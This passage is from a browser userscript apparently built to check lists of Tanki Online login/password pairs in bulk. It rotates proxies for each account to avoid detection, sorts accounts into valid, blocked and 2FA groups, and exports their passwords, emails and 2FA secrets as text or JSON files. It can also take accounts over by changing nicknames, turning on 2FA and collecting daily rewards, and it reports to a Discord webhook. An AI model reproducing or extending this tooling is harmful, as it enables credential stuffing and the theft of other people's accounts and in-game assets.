                После сбора смены ника / привязки скрипт откроет «Безопасность», включит 2FA,
                сохранит secret в отдельное хранилище (вкладка 2FA). По умолчанию выключено.
            </div>
            <div class="tc-section-title" style="margin-top:18px">Script</div>
            <div class="tc-setting-row">
                <div class="tc-setting-label">Interval (ms)</div>
                <input class="tc-setting-input" id="set-interval" type="number" min="400" max="5000">
            </div>
            <div class="tc-setting-row">
                <div class="tc-setting-label">Menu key</div>
                <input class="tc-setting-input" id="set-menukey" type="text">
            </div>
            <div class="tc-section-title" style="margin-top:18px">Appearance</div>
            <div class="tc-mode-row">
                <button class="tc-mode-btn ${CONFIG.THEME === "dark" ? "active" : ""}" id="set-theme-dark">Dark</button>
                <button class="tc-mode-btn ${CONFIG.THEME === "light" ? "active" : ""}" id="set-theme-light">Light</button>
            </div>
            <div class="tc-actions" style="margin-top:18px">
                <button class="tc-btn tc-btn-primary" id="btn-save-settings">Save</button>
                <button class="tc-btn tc-btn-secondary" id="btn-test-discord">Test Discord</button>
            </div>

            ${renderProxyRotationBlock()}

            <div class="tc-section-title" style="margin-top:28px;color:#ef5350">⚠ Danger zone</div>
            <div style="font-size:12px;color:var(--tc-text-dim);line-height:1.55;margin-bottom:12px">
                Сброс баз: Checker, Daily Rubies, архив, статусы, entrance hash, очередь.
                <b>Настройки скрипта сохраняются</b> (Discord, theme, interval, auto-rubies…).
                После сброса — reload страницы.
            </div>
            <div class="tc-actions">
                <button class="tc-btn tc-btn-danger" id="btn-wipe-all">🗑 СБРОСИТЬ БАЗЫ</button>
                <button class="tc-btn tc-btn-danger" id="btn-wipe-hashes-only" style="opacity:.9">🧹 Только entrance hash</button>
            </div>
        `;

        document.getElementById("set-webhook").value = CONFIG.DISCORD_WEBHOOK || "";
        document.getElementById("set-interval").value = CONFIG.CHECK_INTERVAL;
        document.getElementById("set-menukey").value = (CONFIG.MENU_KEY || "f8").toUpperCase();
        document.getElementById("set-proxy-enabled").checked = CONFIG.PROXY_ENABLED !== false;
        document.getElementById("set-ipcheck").checked = !!CONFIG.IP_CHECK_ENABLED;
        document.getElementById("set-rubies-discord").checked = !!CONFIG.DISCORD_RUBIES_NOTIFICATIONS;
        document.getElementById("set-auto-2fa").checked = !!CONFIG.AUTO_ENABLE_2FA;
        bindProxyRotationUI();
        updateProxyRotationUI();

        document.getElementById("set-theme-dark").addEventListener("click", () => {
            CONFIG.THEME = "dark"; saveConfig();
            document.getElementById("tc-menu")?.setAttribute("data-theme", "dark");
            document.getElementById("tc-detail-modal")?.setAttribute("data-theme", "dark");
            document.getElementById("tc-rubies-add-modal")?.setAttribute("data-theme", "dark");
            document.getElementById("tc-assets-modal")?.setAttribute("data-theme", "dark");
            document.querySelector(".tc-toast-stack")?.setAttribute("data-theme", "dark");
            renderSettings();
        });
        document.getElementById("set-theme-light").addEventListener("click", () => {
            CONFIG.THEME = "light"; saveConfig();
            document.getElementById("tc-menu")?.setAttribute("data-theme", "light");
            document.getElementById("tc-detail-modal")?.setAttribute("data-theme", "light");
            document.getElementById("tc-rubies-add-modal")?.setAttribute("data-theme", "light");
            document.getElementById("tc-assets-modal")?.setAttribute("data-theme", "light");
            document.querySelector(".tc-toast-stack")?.setAttribute("data-theme", "light");
            renderSettings();
        });
        document.getElementById("btn-save-settings").addEventListener("click", () => {
            CONFIG.DISCORD_WEBHOOK = normalizeDiscordWebhook(document.getElementById("set-webhook").value) || "";
            CONFIG.CHECK_INTERVAL = parseInt(document.getElementById("set-interval").value) || 800;
            CONFIG.MENU_KEY = (document.getElementById("set-menukey").value || "f8").toLowerCase();
            const prevProxyEnabled = CONFIG.PROXY_ENABLED !== false;
            CONFIG.PROXY_ENABLED = document.getElementById("set-proxy-enabled").checked;
            CONFIG.IP_CHECK_ENABLED = document.getElementById("set-ipcheck").checked;
            CONFIG.DISCORD_RUBIES_NOTIFICATIONS = document.getElementById("set-rubies-discord").checked;
            CONFIG.AUTO_ENABLE_2FA = document.getElementById("set-auto-2fa").checked;
            saveConfig();
            if (prevProxyEnabled && !CONFIG.PROXY_ENABLED) {
                // Пытаемся снять прокси через clearProxy расширения (если bridge поддерживает).
                (async () => {
                    try {
                        if (proxyExtensionBridge && proxyExtensionBridge.connected) {
                            const result = await proxyExtensionBridge.clearProxy();
                            console.log("[PROXY] clearProxy after disable:", result);
                            showToast("Прокси выключены в скрипте; clearProxy отправлен в extension", "info");
                        } else {
                            showToast("Прокси выключены в скрипте. Extension bridge недоступен — clearProxy не подтверждён", "warning");
                        }
                    } catch (err) {
                        console.warn("[PROXY] clearProxy failed:", err);
                        showToast("Прокси выключены в скрипте, но clearProxy не подтверждён extension", "warning");
                    }
                    proxyRotationManager?.emit();
                })();
            } else if (!prevProxyEnabled && CONFIG.PROXY_ENABLED && proxyRotationManager) {
                proxyRotationManager.init().catch(e => proxyRotationManager.handleError(e, false));
            }
            showToast("Saved", "success");
        });
        document.getElementById("btn-test-discord").addEventListener("click", async () => {
    const webhookInput = document.getElementById("set-webhook");
    const raw = webhookInput ? webhookInput.value : "";
    const webhook = normalizeDiscordWebhook(raw);

    if (!webhook) {
        showToast("Webhook URL required", "warning");
        return;
    }

    if (!isValidDiscordWebhook(webhook)) {
        showToast("Некорректный Discord webhook URL", "error");
        console.warn("[Discord] Некорректный webhook URL:", webhook);
        return;
    }

    CONFIG.DISCORD_WEBHOOK = webhook;
    if (webhookInput) webhookInput.value = webhook;

    try {
        saveConfig();
    } catch (e) {
        console.warn("[Discord] Не удалось сохранить настройки:", e);
    }

    showToast("Sending test…", "info");

    try {
        const ok = await testDiscordNotification();
        showToast(ok ? "Test delivered" : "Test failed", ok ? "success" : "error");
        console.log(ok
            ? "[Discord] Тестовое сообщение успешно отправлено"
            : "[Discord] Тестовое сообщение не отправлено");
    } catch (error) {
        console.error("[Discord] Ошибка тестовой отправки:", error);
        showToast("Discord test failed", "error");
    }
});

        document.getElementById("btn-wipe-all").addEventListener("click", () => {
            const msg =
                "Сброс баз аккаунтов\n\n" +
                "Будет удалено:\n" +
                "• база Checker\n" +
                "• база Daily Rubies + архив\n" +
                "• entrance hash\n" +
                "• статусы и очередь сбора\n\n" +
                "Настройки скрипта (Discord, theme, interval…) ОСТАНУТСЯ.\n\n" +
                "Продолжить?";
            if (!confirm(msg)) return;
            if (!confirm("Точно? Базы будут очищены.")) return;
            const n = wipeAllScriptStorage({ keepSettings: true });
            showToast(`Базы сброшены. Ключей: ${n}. Reload…`, "success");
            setTimeout(() => location.reload(), 600);
        });

        document.getElementById("btn-wipe-hashes-only").addEventListener("click", () => {
            if (!confirm("Очистить entrance hash у ВСЕХ аккаунтов (Checker + Rubies + архив)?")) return;
            let n = 0;
            for (const a of RUBIES_ACCOUNTS) {
                if (a.entranceHash) { a.entranceHash = ""; n++; }
                if (a.authMethod === "hash" && a.password) a.authMethod = "credentials";
            }
            for (const a of RUBIES_ARCHIVE) {
                if (a.entranceHash) { a.entranceHash = ""; n++; }
            }
            for (const a of ACCOUNTS) {
                if (a.entranceHash) { a.entranceHash = ""; n++; }
            }
            try { GM_deleteValue(CONFIG.RUBIES_HASH_SWITCH_KEY); } catch (_) {}
            saveRubiesAccounts();
            saveRubiesArchive();
            saveAccounts();
            showToast(`Очищено hash: ${n}`, "success");
            if (currentTab === "settings") renderSettings();
            if (currentTab === "rubies") renderRubies();
            updateUI();
        });
    }

    // =========================================================
    // MODAL / DETAILS
    // =========================================================
    function openDetailModal(login) {
        const acc = ACCOUNTS.find(a => a.login === login) || RUBIES_ACCOUNTS.find(a => a.login === login);
        const st = getAccountStatus(login);
        if (!acc) return;
        const rows = document.getElementById("detail-rows");

        let statusText = "Pending";
        if (st?.deleted) statusText = "Deleted";
        else if (st?.done && st?.valid) statusText = "Valid";
        else if (st?.invalid) statusText = "Invalid";
        else if (st?.blocked) statusText = "Blocked";
        else if (st?.nicknameFixed) statusText = "Nickname changed" + (st.newNickname ? ` (${st.newNickname})` : "");
        else if (st?.nicknameChanged) statusText = "Nickname required";
        else if (st?.twofa) statusText = "2FA";
        else if (st?.skippedLowRank) statusText = "Low rank";
        else if (st?.error) statusText = "Error";

        const rowsData = [
            ["Login", acc.login],
            ["Password", acc.password || "—"],
            ["Entrance hash", acc.entranceHash || "—"],
            ["Email", acc.email || st?.loginEmail || (st?.hasEmail ? "есть" : "—")],
            ["Nickname", st?.username || "—"],
            ["Year", acc.year || "—"],
            ["Bound", acc.bound === true ? "Yes" : acc.bound === false ? "No" : "—"],
            ["Rubies", st?.rubies || "—"],
            ["Crystals", st?.crystals || "—"],
            ["Gold boxes", st?.goldBoxes || "—"],
            ["Tankoins", st?.tankoins || "—"],
            ["Rank", st?.rank || acc.rankFromBase || "—"],
            ["Experience", st?.experience ?? "—"],
            ["Nickname change", st?.nickChange || "—"],
            ["Bonus", st?.bonusReceived ? "Yes" : "No"],
            ["Daily Rubies", st?.rubiesSubscriptionFinished ? "Ended" : (st?.rubiesRemainingDays != null ? `${st.rubiesRemainingDays} days left` : "—")],
            ["Last collection", st?.lastRubiesCollection ? new Date(st.lastRubiesCollection).toLocaleString("ru-RU") : "—"],
            ["Proxy IP", st?.proxyIp || "—"],
            ["Status", statusText]
        ];

        rows.innerHTML = rowsData.map(([label, value]) => `
            <div class="tc-detail-row">
                <span class="tc-detail-label">${escapeHtml(label)}</span>
                <span class="tc-detail-value">${escapeHtml(humanField(value))}</span>
            </div>
        `).join("");

        document.getElementById("tc-detail-modal").classList.add("show");
    }
    function closeDetailModal() {
        document.getElementById("tc-detail-modal").classList.remove("show");
    }

    // =========================================================
    // EXPORT
    // =========================================================
    function plural(n, forms) {
        const abs = Math.abs(n) % 100;
        const n1 = abs % 10;
        if (abs > 10 && abs < 20) return forms[2];
        if (n1 > 1 && n1 < 5) return forms[1];
        if (n1 === 1) return forms[0];
        return forms[2];
    }

    function buildTxtForAccount(acc, st) {
        const lines = [];
        const v = (x) => (x === null || x === undefined || x === "" || x === "null" || x === "undefined" || x === "NaN") ? "—" : String(x);
        lines.push("--------------------------");
        lines.push(`Ник - ${v(st?.username || acc.login)}`);
        lines.push(`Пароль - ${v(acc.password)}`);
        lines.push(`Ранг - ${v(st?.rank || acc.rankFromBase)}`);
        lines.push(`Почта - ${v(acc.email || st?.loginEmail)}`);
        lines.push(`Кристаллы - ${v(st?.crystals ? formatAmount(st.crystals) : null)}`);
        lines.push(`Привязан - ${acc.bound === true ? "да" : acc.bound === false ? "нет" : "—"}`);
        lines.push(`Рубины - ${v(st?.rubies ? formatAmount(st.rubies) : null)}`);
        lines.push(`Танкоины - ${v(st?.tankoins ? formatAmount(st.tankoins) : null)}`);
        const changed = st?.nicknameFixed || !!st?.newNickname;
        lines.push(`Смена ника - ${changed ? "да" : "нет"}`);
        lines.push(`Новый ник - ${changed && st?.newNickname ? st.newNickname : "—"}`);
        lines.push(`Компенсация - ${st?.bonusReceived ? "да" : "нет"}`);
        lines.push(`Год регистрации - ${v(acc.year)}`);
        if (st?.rubiesRemainingDays != null) {
            lines.push(`Ежедневные рубины - ${st.rubiesRemainingDays} ${plural(st.rubiesRemainingDays, ["день", "дня", "дней"])}`);
        } else {
            lines.push(`Ежедневные рубины - —`);
        }
        const twofa = get2FAByLogin(acc.login);
        if (twofa?.secret) lines.push(`2FA secret - ${twofa.secret}`);
        return lines.join("\n");
    }

    function exportVerifiedTxt() {
        const verified = [];
        for (const acc of ACCOUNTS) {
            const st = getAccountStatus(acc.login);
            if (st && st.done === true && st.valid === true) verified.push({ acc, st });
        }
        if (verified.length === 0) {
            showToast("No verified accounts", "warning");
            return;
        }
        const text = verified.map(({ acc, st }) => buildTxtForAccount(acc, st)).join("\n");
        const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = `tanki-checked-${new Date().toISOString().slice(0, 10)}.txt`;
        a.click();
        showToast(`Exported ${verified.length} accounts`, "success");
    }

        function exportSectionTxt(type) {
        const sections = {
            valid:    { name: "valid",    title: "Валидные",              filter: st => st.done && st.valid },
            invalid:  { name: "invalid",  title: "Неверный логин/пароль", filter: st => st.invalid },
            blocked:  { name: "blocked",  title: "Заблокированные",       filter: st => st.blocked },
            twofa:    { name: "2fa",      title: "2FA",                   filter: st => st.twofa },
            nickname: { name: "nickname", title: "Требуется смена ника",  filter: st => st.nicknameChanged && !st.nicknameFixed },
            error:    { name: "error",    title: "Ошибки",                filter: st => st.error },
            lowrank:  { name: "lowrank",  title: "Низкий ранг",           filter: st => st.skippedLowRank },
            bonus:    { name: "bonus",    title: "С компенсацией",        filter: st => st.bonusReceived },
            unchecked:{ name: "unchecked",title: "Не проверились",          filter: (st, acc) => !isAccountCheckCompleted(acc.login) },
            all:      { name: "all",      title: "Все аккаунты",          filter: () => true }
        };
        const section = sections[type];
        if (!section) return;

        const items = [];
        for (const acc of ACCOUNTS) {
            const st = getAccountStatus(acc.login) || {};
            if (section.filter(st, acc)) items.push({ acc, st });
        }
        if (items.length === 0) {
            showToast(`Раздел «${section.title}» пуст`, "warning");
            return;
        }

        const text = items.map(({ acc, st }) => {
            const lines = [];
            lines.push("--------------------------");
            lines.push(`Логин - ${acc.login}`);
            if (acc.password) lines.push(`Пароль - ${acc.password}`);
            if (st.username) lines.push(`Ник - ${st.username}`);
            if (acc.email) lines.push(`Почта - ${acc.email}`);
            if (st.loginEmail) lines.push(`Вход через - ${st.loginEmail}`);
            if (acc.year) lines.push(`Год - ${acc.year}`);
            if (st.rank || acc.rankFromBase) lines.push(`Ранг - ${st.rank || acc.rankFromBase}`);
            if (st.rubies) lines.push(`Рубины - ${formatAmount(st.rubies)}`);
            if (st.crystals) lines.push(`Кристаллы - ${formatAmount(st.crystals)}`);
            if (st.tankoins) lines.push(`Танкоины - ${formatAmount(st.tankoins)}`);
            if (st.goldBoxes !== null && st.goldBoxes !== undefined && st.goldBoxes !== "") {
                lines.push(`Золотые ящики - ${formatAmount(st.goldBoxes)}`);
            }
            if (st.experience != null) lines.push(`Опыт - ${st.experience}`);
            if (acc.bound !== null && acc.bound !== undefined) lines.push(`Привязан - ${acc.bound ? "да" : "нет"}`);
            if (st.bonusReceived) lines.push(`Компенсация - да`);
            if (st.newNickname) lines.push(`Новый ник - ${st.newNickname}`);
            if (st.nickChange) lines.push(`Смена ника - ${st.nickChange}`);
            if (st.proxyIp) lines.push(`IP - ${st.proxyIp}`);
            if (st.reason) lines.push(`Причина - ${st.reason}`);
            if (type === "unchecked") lines.push("Статус - не завершена проверка");
            return lines.join("\n");
        }).join("\n");

        const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = `tanki-${section.name}-${new Date().toISOString().slice(0, 10)}.txt`;
        a.click();
        setTimeout(() => URL.revokeObjectURL(a.href), 1000);
        showToast(`Выгружено ${items.length} акк. (${section.title})`, "success");
    }

    function exportDataJSON() {
        const data = ACCOUNTS.map(acc => ({
            login: acc.login,
            password: acc.password,
            email: acc.email,
            year: acc.year,
            bound: acc.bound,
            ...getAccountStatus(acc.login)
        }));
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = `tanki-checker-${new Date().toISOString().slice(0, 10)}.json`;
        a.click();
    }

    // =========================================================
    // TOAST
    // =========================================================
    function showToast(msg, type = "info") {
        const stack = document.querySelector(".tc-toast-stack");
        if (!stack) { console.log("[toast]", msg); return; }
        const icons = {
            success: ICONS.check,
            error: ICONS.x,
            warning: ICONS.alert,
            info: ICONS.info
        };
        const titles = { success: "Success", error: "Error", warning: "Warning", info: "Info" };
        const toast = document.createElement("div");
        toast.className = `tc-toast ${type}`;
        toast.innerHTML = `
            <div class="tc-toast-icon">${icons[type] || ICONS.info}</div>
            <div class="tc-toast-body">
                <div class="tc-toast-title">${titles[type] || "Info"}</div>
                <div class="tc-toast-msg">${escapeHtml(msg)}</div>
            </div>
            <div class="tc-toast-progress"></div>
        `;
        stack.appendChild(toast);
        requestAnimationFrame(() => toast.classList.add("show"));
        setTimeout(() => {
            toast.classList.remove("show");
            setTimeout(() => toast.remove(), 300);
        }, 3000);
    }

    // =========================================================
    // UI UPDATE
    // =========================================================
    function updateUI() {
        let q = { remaining: 0, total: 0, done: 0, currentLogin: null };
        try { q = getCheckQueueStats(); } catch (_) {}

        const bar = document.getElementById("tc-status-bar");
        if (bar) {
            if (!isRunning) bar.innerHTML = `● <span class="hl">Stopped</span> · Mode: ${MODE} · Осталось: <span class="hl">${q.remaining}</span>`;
            else if (isPaused) bar.innerHTML = `⏸ <span class="hl">Paused</span> · Mode: ${MODE} · Осталось: <span class="hl">${q.remaining}</span>`;
            else {
                const current = q.currentLogin || shuffledAccounts[currentIndex % Math.max(shuffledAccounts.length, 1)]?.login;
                bar.innerHTML = `● Running: <span class="hl">${escapeHtml(current || "—")}</span> · Осталось: <span class="hl">${q.remaining}</span>/${q.total} · Mode: ${MODE}`;
            }
        }
        const dashRem = document.getElementById("tc-queue-remaining");
        if (dashRem) dashRem.textContent = String(q.remaining);

        const chip = document.getElementById("tc-header-status");
        if (chip) {
            let cls = "idle", label = "System ready";
            if (isRunning && !isPaused) { cls = ""; label = `Running · ${q.remaining} left`; }
            else if (isRunning && isPaused) { cls = "warning"; label = "Paused"; }
            chip.className = `tc-chip ${cls}`;
            const span = chip.querySelector("span:last-child");
            if (span) span.textContent = label;
        }
        if (currentTab === "dashboard") renderDashboard();
        if (currentTab === "rubies") renderRubies();
    }

    // =========================================================
    // START LOOP
    // =========================================================
    async function startChecking() {
        if (!isRunning) return;

        if (MODE === "rubies") {
            const restored = restoreRubiesRun();
            if (!restored) {
                const count = beginRubiesRun();
                if (!count) {
                    showToast("Нет аккаунтов Daily Rubies", "warning");
                    setRunningState(false);
                    clearRubiesRunState();
                    updateUI();
                    return;
                }
            }
        } else if (MODE === "fastValid") {
            if (FAST_VALID_ACCOUNTS.length === 0) {
                showToast("База FastValid пуста — импортируй аккаунты", "warning");
                setRunningState(false);
                updateUI();
                return;
            }
            if (!restoreFastValidQueue()) {
                const count = beginFastValidQueue();
                if (!count) {
                    showToast("Нет непроверенных аккаунтов в FastValid", "warning");
                    setRunningState(false);
                    updateUI();
                    return;
                }
            }
        } else {
            if (ACCOUNTS.length === 0) {
                showToast("No accounts", "warning");
                setRunningState(false);
                updateUI();
                return;
            }
            if (!restoreCheckQueue()) {
                const count = beginCheckQueueFromAccounts(getFilteredAccountsForCheck());
                if (!count) {
                    showToast("No accounts match filters", "warning");
                    setRunningState(false);
                    updateUI();
                    return;
                }
            }
        }
        if (shuffledAccounts.length === 0) {
            showToast("No accounts match filters", "warning");
            setRunningState(false);
            updateUI();
            return;
        }
        console.log(`[${new Date().toLocaleTimeString()}] ===== START (${MODE}) ${shuffledAccounts.length} accounts =====`);

        while (isRunning) {
            if (isPaused) { await sleep(400); continue; }
            if (checkConnectionError() && (MODE === "checker" || MODE === "fastValid")) { location.reload(); return; }

            const acc = getNextAccount();
            if (!acc) {
                setRunningState(false);
                if (MODE === "checker" || MODE === "nickname") clearCheckQueue();
                if (MODE === "fastValid") clearFastValidQueue();
                updateUI();
                showToast(MODE === "rubies" ? "All accounts processed" : "All matching accounts checked", "success");
                break;
            }

            if (MODE === "checker" || MODE === "fastValid") {
                if (CONFIG.PROXY_ENABLED) {
                    if (!proxyRotationManager) {
                        console.error("[PROXY] Менеджер ротации не инициализирован — аккаунт не запускается");
                        await sleep(1000);
                        continue;
                    }
                    const proxyReady = await proxyRotationManager.beginAccountCheck(acc.login);
                    if (!proxyReady) {
                        console.error(`[PROXY] Не удалось активировать прокси для аккаунта ${acc.login} — аккаунт НЕ запускается`);
                        await sleep(1500);
                        continue;
                    }
                } else if (proxyRotationManager) {
                    await proxyRotationManager.beginAccountCheck(acc.login);
                }
                if (MODE === "checker") {
                    await checkAccount(acc.login, acc.password, acc.email);
                } else {
                    await checkAccountFastValid(acc.login, acc.password, acc.email);
                }
            }
            else if (MODE === "nickname") await processNicknameAccount(acc);
            else if (MODE === "rubies") {
                const res = await processRubiesAccount(acc);
                if (res?.status === "done" || res?.status === "next") break;
            }

            if (!isRunning) break;
            await sleep(MODE === "nickname" ? 120 : CONFIG.CHECK_INTERVAL);
            updateUI();
        }
        setRunningState(false);
        updateUI();
    }

    // =========================================================
    // SCHEDULER
    // =========================================================
    function maybeResetRubiesOnLoad() {
        if (!CONFIG.RUBIES_AUTO_ENABLED) return false;

        const now = new Date();
        const utcMs = now.getTime() + now.getTimezoneOffset() * 60000;
        const msk = new Date(utcMs + 3 * 60 * 60 * 1000);
        const minutes = msk.getHours() * 60 + msk.getMinutes();
        const resetMinute = 4 * 60 + 59;
        const todayKey = `${msk.getFullYear()}-${String(msk.getMonth() + 1).padStart(2, "0")}-${String(msk.getDate()).padStart(2, "0")}`;

        if (minutes < resetMinute) return false;
        if (GM_getValue("tanki_rubies_daily_reset_v80", "") === todayKey) return false;

        resetRubiesDailyStatuses();
        const count = getRubiesEligibleAccounts().length;
        if (!count) return true;

        console.log(`[Daily Rubies] 🚀 Пропущен момент 05:00 МСК — выполняю дневной сброс и запуск сейчас (${count})`);
        MODE = "rubies";
        saveConfig();
        setRunningState(true);
        isPaused = false;
        setTimeout(() => { startChecking(); updateUI(); }, 1800);
        return true;
    }

    function scheduleRubies() {
        if (rubiesSchedulerTimer) clearInterval(rubiesSchedulerTimer);
        rubiesSchedulerTimer = setInterval(() => {
            if (!CONFIG.RUBIES_AUTO_ENABLED) return;
            const now = new Date();
            const utcMs = now.getTime() + now.getTimezoneOffset() * 60000;
            const msk = new Date(utcMs + 3 * 60 * 60 * 1000);
            const hh = String(msk.getHours()).padStart(2, "0");
            const mm = String(msk.getMinutes()).padStart(2, "0");
            const current = `${hh}:${mm}`;
            const todayKey = `${msk.getFullYear()}-${String(msk.getMonth() + 1).padStart(2, "0")}-${String(msk.getDate()).padStart(2, "0")}`;

            if (current !== "05:00") return;
            if (GM_getValue("tanki_rubies_daily_reset_v80", "") === todayKey) return;

            resetRubiesDailyStatuses();

            const count = getRubiesEligibleAccounts().length;
            if (!count) {
                console.log("[Daily Rubies] ⏰ 05:00 МСК: нет аккаунтов для сбора");
                return;
            }

            console.log(`[Daily Rubies] ⏰ 05:00 МСК: запуск дневного сбора (${count} аккаунтов)`);
            MODE = "rubies";
            saveConfig();
            setRunningState(true);
            isPaused = false;
            updateUI();
            startChecking();
        }, 10000);
    }

    // =========================================================
    // MENU TOGGLE / HOTKEY
    // =========================================================
    function toggleMenu() {
        if (!document.getElementById("tc-menu")) {
            try { createMenu(); } catch (err) {
                console.error("[menu] createMenu failed:", err);
                return;
            }
        }
        const menu = document.getElementById("tc-menu");
        const overlay = document.getElementById("tc-overlay");
        if (!menu) {
            console.warn("[menu] #tc-menu still missing after createMenu");
            return;
        }
        menuOpen = !menuOpen;
        menu.classList.toggle("open", menuOpen);
        overlay?.classList.toggle("open", menuOpen);
        if (menuOpen) {
            try {
                updateUI();
                if (currentTab === "dashboard") renderDashboard();
                if (currentTab === "rubies") renderRubies();
                if (currentTab === "checker") renderChecker();
                if (currentTab === "results") renderResults();
                if (currentTab === "twofa") render2FA();
                if (currentTab === "accounts") renderAccounts();
                if (currentTab === "settings") renderSettings();
            } catch (err) {
                console.error("[menu] open render error:", err);
            }
        }
    }
    function closeMenu() {
        menuOpen = false;
        document.getElementById("tc-menu")?.classList.remove("open");
        document.getElementById("tc-overlay")?.classList.remove("open");
    }

    document.addEventListener("keydown", e => {
        if (document.activeElement?.tagName === "INPUT" || document.activeElement?.tagName === "TEXTAREA") return;
        const wanted = (CONFIG.MENU_KEY || "f8").toLowerCase();
        const code = (e.code || "").toLowerCase();
        if (code === wanted || (wanted === "f8" && e.key === "F8") || code === "key" + wanted) {
            e.preventDefault();
            try { toggleMenu(); } catch (err) {
                console.error("[menu] toggleMenu error:", err);
            }
        }
    }, true);


    const rubiesStatusStyle = document.createElement("style");
    rubiesStatusStyle.textContent = `
        .rubies-status-toggle{cursor:pointer;border:0;transition:transform .16s ease,filter .16s ease;}
        .rubies-status-toggle:hover{transform:translateY(-1px);filter:brightness(1.12);}
    `;
    document.head.appendChild(rubiesStatusStyle);

    // =========================================================
    // INIT
    // =========================================================
    function init() {
        if (isInitialized) return;
        isInitialized = true;
        loadAccounts();
        loadFastValidAccounts();
        loadRubiesAccounts();
        loadRubiesArchive();
        const manualHashAdded = syncManualHashAccounts();
        if (manualHashAdded) console.log(`[Daily Rubies] 🔑 Синхронизировано ручных hash-аккаунтов: ${manualHashAdded}`);
        dedupeSharedEntranceHashes(getCurrentNickname());
        syncCurrentManualRubiesHash();
        startManualHashSyncWatcher();
        try {
            createMenu();
        } catch (err) {
            console.error("[init] createMenu failed:", err);
        }
        initProxyRotation();
        try { updateUI(); } catch (err) { console.error("[init] updateUI:", err); }
        startTankBuilderGuard();
        startEmptyLoginWatcher();

        const dailyResetStarted = maybeResetRubiesOnLoad();
        if (CONFIG.RUBIES_AUTO_ENABLED) scheduleRubies();

        const rubiesQueue = getRubiesRunQueue();
        if (dailyResetStarted) {
            console.log("🔄 Daily Rubies: daily reset/start handled on page load");
        }
        if (!dailyResetStarted && rubiesQueue.length && CONFIG.RUBIES_AUTO_START_ON_RELOAD) {
            console.log("🔄 Daily Rubies: resume queue after reload");
            MODE = "rubies";
            isRunning = true;
            GM_setValue(CONFIG.MODE_KEY, "rubies");
            setTimeout(() => { startChecking(); updateUI(); }, 1800);
        } else if (loadRunningState()) {
            console.log("🔄 Auto-resume after reload");
            isRunning = true;
            setTimeout(() => { startChecking(); updateUI(); }, 1800);
        }
        console.log("◆ Tanki Checker + Rubies v1.0.1 started | Mode:", MODE);
    }

    if (document.readyState === "complete") init();
    else window.addEventListener("load", init);
})();
